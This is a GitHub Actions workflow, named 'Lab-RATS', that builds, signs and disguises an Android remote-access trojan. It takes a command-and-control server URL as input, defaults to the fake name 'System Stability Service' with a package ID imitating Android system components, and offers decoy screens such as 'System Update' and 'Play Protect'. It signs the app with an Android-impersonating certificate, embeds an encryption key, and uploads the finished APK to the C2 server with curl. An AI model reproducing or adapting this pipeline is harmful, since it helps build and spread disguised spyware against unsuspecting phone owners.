name: "Lab-RATS · Build APK"

on:
  workflow_dispatch:
    inputs:
      app_name:
        description: "App label shown on the device"
        required: true
        default: "System Stability Service"
      package_id:
        description: "Package ID / applicationId"
        required: true
        default: "com.android.system.stability"
      webhook_url:
        description: "C2 server URL"
        required: true
      decoy_choice:
        description: "Decoy screen  1=System Update  2=Calculator  3=Weather  4=Play Protect  5=Install Wizard"
        required: true
        default: "1"
        type: choice
        options: ["1", "2", "3", "4", "5"]
      version_name:
        description: "Version name string"
        required: false
        default: ""
      icon_url:
        description: "URL to a square PNG/JPG for the launcher icon"
        required: false
        default: ""

env:
  CMDLINE_TOOLS_BUILD: "11076708"
  ANDROID_PLATFORM:    "android-34"
  ANDROID_BUILD_TOOLS: "34.0.0"
  # ── HARDCODED KEYSTORE ─────────────────────────────────────────────────────
  # Generate once locally, then paste the base64 output below:
  #   keytool -genkey -v -keystore lab-rats-keystore.jks -alias lab-rats-key \
  #     -keyalg RSA -keysize 2048 -validity 10000 \
  #     -storepass LabRats2024! -keypass LabRats2024! \
  #     -dname "CN=System Services,OU=Android,O=Android,L=US,ST=CA,C=US"
  #   base64 -w0 lab-rats-keystore.jks
  #   rm lab-rats-keystore.jks
  KEYSTORE_B64: ""
  KEYSTORE_PASS: "LabRats2024!"
  KEY_ALIAS:     "lab-rats-key"
  KEY_PASS:      "LabRats2024!"

jobs:
  build:
    name: "Build · Sign · Deliver"
    runs-on: ubuntu-latest
    timeout-minutes: 35

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: "17"
          distribution: temurin

      - name: Cache Android SDK
        id: sdk-cache
        uses: actions/cache@v4
        with:
          path: ${{ runner.temp }}/android-sdk
          key: android-sdk-${{ env.ANDROID_PLATFORM }}-${{ env.ANDROID_BUILD_TOOLS }}-${{ env.CMDLINE_TOOLS_BUILD }}

      - name: Install Android SDK
        if: steps.sdk-cache.outputs.cache-hit != 'true'
        run: |
          SDK_ROOT="${{ runner.temp }}/android-sdk"
          mkdir -p "$SDK_ROOT/cmdline-tools"
          wget -q \
            "https://dl.google.com/android/repository/commandlinetools-linux-${{ env.CMDLINE_TOOLS_BUILD }}_latest.zip" \
            -O /tmp/cmdlinetools.zip
          unzip -q /tmp/cmdlinetools.zip -d /tmp/ct_extract
          mv /tmp/ct_extract/cmdline-tools "$SDK_ROOT/cmdline-tools/latest"
          yes | "$SDK_ROOT/cmdline-tools/latest/bin/sdkmanager" \
            --sdk_root="$SDK_ROOT" \
            "platforms;${{ env.ANDROID_PLATFORM }}" \
            "build-tools;${{ env.ANDROID_BUILD_TOOLS }}" \
            "platform-tools" 2>/dev/null

      - name: Export SDK environment
        run: |
          SDK_ROOT="${{ runner.temp }}/android-sdk"
          {
            echo "ANDROID_HOME=$SDK_ROOT"
            echo "ANDROID_SDK_ROOT=$SDK_ROOT"
          } >> "$GITHUB_ENV"
          {
            echo "$SDK_ROOT/cmdline-tools/latest/bin"
            echo "$SDK_ROOT/platform-tools"
            echo "$SDK_ROOT/build-tools/${{ env.ANDROID_BUILD_TOOLS }}"
          } >> "$GITHUB_PATH"

      - name: Cache Gradle
        uses: actions/cache@v4
        with:
          path: |
            ~/.gradle/caches
            ~/.gradle/wrapper
          key: gradle-${{ runner.os }}-${{ hashFiles('app/build.gradle','build.gradle','settings.gradle','gradle/wrapper/gradle-wrapper.properties') }}
          restore-keys: gradle-${{ runner.os }}-

      # ── 5. BUILD PROPERTIES (hardcoded — no secrets) ───────────────────────
      - name: Write local.properties
        env:
          WEBHOOK_URL:  ${{ inputs.webhook_url }}
          DECOY_CHOICE: ${{ inputs.decoy_choice }}
        run: |
          {
            printf 'sdk.dir=%s\n'      "$ANDROID_HOME"
            printf 'WEBHOOK_URL=%s\n'  "$WEBHOOK_URL"
            printf 'DECOY_CHOICE=%s\n' "$DECOY_CHOICE"
            printf 'ENCRYPTION_KEY=%s\n' "AndroidKernel1337"
          } > local.properties

      - name: Decode keystore
        run: |
          printf '%s' "${{ env.KEYSTORE_B64 }}" | base64 --decode > lab-rats-keystore.jks
          MAGIC=$(xxd -p lab-rats-keystore.jks | head -c 8)
          if [ "$MAGIC" != "feedfeed" ]; then
            echo "::error::KEYSTORE_B64 invalid (magic: $MAGIC)"
            exit 1
          fi

      - name: Write keystore.properties
        run: |
          {
            printf 'storeFile=%s\n'     "lab-rats-keystore.jks"
            printf 'storePassword=%s\n' "${{ env.KEYSTORE_PASS }}"
            printf 'keyAlias=%s\n'      "${{ env.KEY_ALIAS }}"
            printf 'keyPassword=%s\n'   "${{ env.KEY_PASS }}"
          } > keystore.properties

      # ── 6. CUSTOM ICON (optional) ──────────────────────────────────────────
      - name: Replace launcher icon
        if: ${{ inputs.icon_url != '' }}
        run: |
          pip install pillow --quiet
          curl -fsSL "${{ inputs.icon_url }}" -o /tmp/custom_icon_raw
          python3 - << 'PYEOF'
          from PIL import Image
          import sys, os
          src_path = '/tmp/custom_icon_raw'
          try:
              src = Image.open(src_path).convert('RGBA')
          except Exception as e:
              print(f'::error::Failed to open icon image: {e}')
              sys.exit(1)
          w, h = src.size
          if w != h:
              side = min(w, h)
              left = (w - side) // 2
              top  = (h - side) // 2
              src  = src.crop((left, top, left + side, top + side))
          DENSITIES = {
              'mdpi':    (48,  108),
              'hdpi':    (72,  162),
              'xhdpi':   (96,  216),
              'xxhdpi':  (144, 324),
              'xxxhdpi': (192, 432),
          }
          RES_BASE = 'app/src/main/res'
          for density, (launcher_px, fg_px) in DENSITIES.items():
              folder = f'{RES_BASE}/mipmap-{density}'
              if not os.path.isdir(folder):
                  print(f'[skip] {folder} not found')
                  continue
              launcher_img = src.resize((launcher_px, launcher_px), Image.LANCZOS)
              launcher_img.save(f'{folder}/ic_launcher.webp',       'WEBP', quality=90)
              launcher_img.save(f'{folder}/ic_launcher_round.webp', 'WEBP', quality=90)
              safe_px   = int(fg_px * 0.667)
              fg_canvas = Image.new('RGBA', (fg_px, fg_px), (0, 0, 0, 0))
              content   = src.resize((safe_px, safe_px), Image.LANCZOS)
              offset    = (fg_px - safe_px) // 2
              fg_canvas.paste(content, (offset, offset), content)
              fg_canvas.save(f'{folder}/ic_launcher_foreground.webp', 'WEBP', quality=90)
              print(f'[{density}] launcher={launcher_px}px  foreground={fg_px}px  OK')
          store_img = src.resize((512, 512), Image.LANCZOS).convert('RGB')
          store_img.save('app/src/main/ic_launcher-playstore.png', 'PNG')
          print('[playstore] 512x512 PNG updated')
          PYEOF

      # ── 7. IDENTITY PATCHES ────────────────────────────────────────────────
      - name: Patch build.gradle
        run: |
          sed -i \
            's|applicationId "[^"]*"|applicationId "${{ inputs.package_id }}"|g' \
            app/build.gradle
          sed -i \
            "s|versionCode [0-9]*|versionCode ${{ github.run_number }}|g" \
            app/build.gradle
          if [ -n "${{ inputs.version_name }}" ]; then
            sed -i \
              's|versionName "[^"]*"|versionName "${{ inputs.version_name }}"|g' \
              app/build.gradle
          fi
          echo "[build.gradle patched]"
          grep -E 'applicationId|versionCode|versionName' app/build.gradle

      - name: Patch strings.xml  (app_name)
        run: |
          python3 - << 'PYEOF'
          import re, html
          raw  = """${{ inputs.app_name }}"""
          safe = html.escape(raw, quote=False)
          path = 'app/src/main/res/values/strings.xml'
          with open(path, 'r', encoding='utf-8') as fh:
              content = fh.read()
          content = re.sub(
              r'<string name="app_name">[^<]*</string>',
              f'<string name="app_name">{safe}</string>',
              content
          )
          with open(path, 'w', encoding='utf-8') as fh:
              fh.write(content)
          print(f'[strings.xml] app_name → {safe}')
          PYEOF

      # ── 8. BUILD ───────────────────────────────────────────────────────────
      - name: Make gradlew executable
        run: chmod +x gradlew

      - name: Build release APK
        env:
          GRADLE_OPTS: >-
            -Dorg.gradle.jvmargs=-Xmx2560m
            -XX:MaxMetaspaceSize=512m
            -Dfile.encoding=UTF-8
        run: |
          ./gradlew clean assembleRelease \
            --no-daemon \
            --stacktrace \
            --warning-mode all \
            2>&1 | tee build_output.txt

      # ── 9. PACKAGE & UPLOAD ────────────────────────────────────────────────
      - name: Stage APK
        id: stage
        run: |
          TS=$(date -u +%Y%m%d_%H%M%S)
          LABEL="${{ inputs.package_id }}_${TS}"
          mkdir -p dist
          cp app/build/outputs/apk/release/app-release.apk "dist/${LABEL}.apk"
          echo "apk_path=dist/${LABEL}.apk" >> "$GITHUB_OUTPUT"
          echo "apk_label=${LABEL}"         >> "$GITHUB_OUTPUT"
          ls -lh "dist/${LABEL}.apk"

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: ${{ steps.stage.outputs.apk_label }}
          path: ${{ steps.stage.outputs.apk_path }}
          retention-days: 3

      # ── 10. C2 DELIVERY ────────────────────────────────────────────────────
      - name: Deliver to C2 Vault
        continue-on-error: true
        env:
          C2_SERVER_URL: ${{ inputs.webhook_url }}
          APK_PATH:      ${{ steps.stage.outputs.apk_path }}
        run: |
          if [ -z "$C2_SERVER_URL" ]; then
            echo "C2_SERVER_URL not configured — APK is in the GitHub artifact above."
            exit 0
          fi
          HTTP_STATUS=$(curl -s -o /tmp/c2_resp.txt -w "%{http_code}" \
            --max-time 45 \
            -X POST \
            -H "X-Device-Id: GHBuild_${{ github.run_id }}" \
            -F "file=@${APK_PATH}" \
            "${C2_SERVER_URL}/upload")
          if [ "$HTTP_STATUS" -ge 200 ] && [ "$HTTP_STATUS" -lt 300 ]; then
            echo "C2 delivery OK (HTTP $HTTP_STATUS)"
          else
            echo "::warning::C2 delivery returned HTTP ${HTTP_STATUS}"
            cat /tmp/c2_resp.txt || true
          fi

      # ── 11. CLEANUP ────────────────────────────────────────────────────────
      - name: Scrub secrets from runner
        if: always()
        run: |
          rm -f lab-rats-keystore.jks
          rm -f keystore.properties
          rm -f local.properties
          
